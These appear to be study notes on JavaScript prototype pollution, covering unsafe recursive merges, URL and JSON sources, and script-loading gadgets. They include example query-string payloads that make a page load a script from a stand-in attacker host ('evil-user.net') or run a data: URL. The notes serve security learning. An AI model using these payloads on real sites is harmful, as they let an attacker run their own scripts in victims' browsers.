## What is it
Javascript vulnerability that enables an attacker to add arbitrary object prototypes.
By itself it may not be exploitable, however when the application unsafely handles user defined prototypes, this can be chained with othere vulnerabilities like DOM XSS
## How do the vulnerabilities arise
Arises when a javascript function recursively merges an object containing user-controllable properties into an existing object, without sanitizing keys. 
This would allow an attacker to inject a property with a key like \_\_proto\_\_ along with arbitrary nested properties. 
Since proto has a special meaning, the merge may assign the new properties to the prototype rather than the object itself.

## Common sources
Url - `https://vulnerable-website.com/?__proto__[evilProperty]=payload`
 although you may think it will look like this
 `{ existingProperty1: 'foo', existingProperty2: 'bar', __proto__: { evilProperty: 'payload' } }`
 due to merging, it would do this instead
 `targetObject.__proto__.evilProperty = 'payload';`
JSON based input -`{ "__proto__": { "evilProperty": "payload" } }`
`const objectLiteral = {__proto__: {evilProperty: 'payload'}}; 
`const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}'); 
`objectLiteral.hasOwnProperty('__proto__');// false
`objectFromJson.hasOwnProperty('__proto__'); // true` If the object is run through JSON.parse without sanitizing keys, the vulnerability is present.

web messages - - Web messages


## Prototype Pollution gadgets
A gadget provides a means of turniong the vulnerability into an actual exploit. 
Find a property that is used by the app in an unsafe way, such as passing it into a sink unsafely, or attacker-controllable. meaning the object must be able to inherit a malicious version of the property added to the prototype by an attacker.

Basically here is a config object that contains a property that is set to default. 
`let transport_url = config.transport_url || defaults.transport_url;`
if this is used to say add a script to the page
``let script = document.createElement('script');
`script.src = `${transport_url}/example.js`;
`document.body.appendChild(script);``
if these remain default, there is the potential for a gadget. Assuming the global Object prototype contains the user defined transport_url property, this will be inherrited by the config object, and then set as the source. 
Lets say we can pollute based on url
`https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net`
or
`https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//`
try both with and without the //
